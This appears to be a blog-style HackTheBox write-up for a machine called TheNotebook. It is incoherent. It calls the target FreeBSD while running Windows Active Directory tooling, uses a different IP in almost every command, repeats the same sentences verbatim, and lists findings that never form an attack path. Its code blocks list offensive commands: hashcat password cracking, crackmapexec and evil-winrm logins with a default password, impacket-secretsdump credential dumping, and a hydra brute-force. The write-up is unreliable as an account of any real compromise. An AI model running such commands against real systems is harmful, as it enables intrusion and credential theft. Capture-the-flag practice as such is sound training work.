---
TitleSEO: "HackTheBox — TheNotebook (Medium FreeBSD) | ZureFX"
TitlePost: "HackTheBox — TheNotebook (Medium FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox TheNotebook. Path Traversal and SeImpersonatePrivilege to achieve medium compromise on FreeBSD."
Keywords: "offsec, windows, active directory, forensics, pwntilldawn, easy"
URL: "https://zurefx.github.io/writeups/htb-thenotebook-519.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-thenotebook-519/"
Date: "2025-09-24"
Tags: "OffSec, Windows, Active Directory, Forensics, PwnTillDawn, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-thenotebook-519"
Permalink: "/writeups/htb-thenotebook-519.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **TheNotebook** is rated **Medium** on HackTheBox. It runs **FreeBSD** and the IP address during this analysis was `10.56.211.72`.

### Objectives

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
crackmapexec smb 10.51.138.221 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.110.242.102 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.37.243.194
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target.

### SMB Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.129.82.177 -u administrator -p 'P@ssw0rd!' --shares
```

Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **AS-REP Roasting**.

The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials.

### Initial Access

The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
gobuster dir -u http://10.48.8.221/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.31.95.1
evil-winrm -i 10.77.183.106 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.67.73.237 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality.

## Privilege Escalation

### Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.88.200.218 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.79.45.119 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
crackmapexec smb 10.64.164.18 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p27017,21,21 10.65.244.189 -oN scan.txt
feroxbuster -h
```

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

## Summary

### Tools Used

- `crackmapexec`
- `john`
- `nmap`
- `socat`
- `feroxbuster`

### Key Takeaways

- Path Traversal
- SeImpersonatePrivilege
- AS-REP Roasting
- LAPS Abuse
